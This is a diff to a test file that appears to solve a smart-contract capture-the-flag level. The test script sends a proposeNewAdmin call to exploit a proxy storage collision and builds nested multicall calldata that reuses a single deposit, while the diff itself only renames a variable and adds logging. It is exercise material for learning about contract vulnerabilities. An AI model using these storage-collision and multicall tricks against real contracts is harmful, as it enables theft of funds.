@@ -34,9 +34,8 @@ it("solves the challenge", async function () {
 
     //  console.log(await challenge.whitelisted(eoaAddress));
   const iface = new ethers.utils.Interface(["function proposeNewAdmin(address _newAdmin) external"]);
-  const methodCallData: string = iface.encodeFunctionData("proposeNewAdmin", [ eoaAddress ]);
-
-  
+  const proposeNewAdminData: string = iface.encodeFunctionData("proposeNewAdmin", [ eoaAddress ]);
+  console.log("proposeNewAdminData", proposeNewAdminData);
 
   // You can see that maxBalance is the same as the level address! 
   const maxBalance = (await challenge.maxBalance())._hex;
@@ -47,7 +46,7 @@ it("solves the challenge", async function () {
   tx = await eoa.sendTransaction({
       from: eoaAddress,
       to: challenge.address,
-      data: methodCallData
+      data: proposeNewAdminData
   });
   const txReceipt = await tx.wait();
 
@@ -95,6 +94,8 @@ it("solves the challenge", async function () {
   const depositData = iface2.encodeFunctionData("deposit", []);
   const innerMulticallData = iface2.encodeFunctionData("multicall", [[depositData]]);
   const multicallData = iface2.encodeFunctionData("multicall", [[depositData, innerMulticallData, executeData]]);
+
+  console.log("multicallData", multicallData);
 
   await waitTx(eoa.sendTransaction({
     from: eoaAddress,
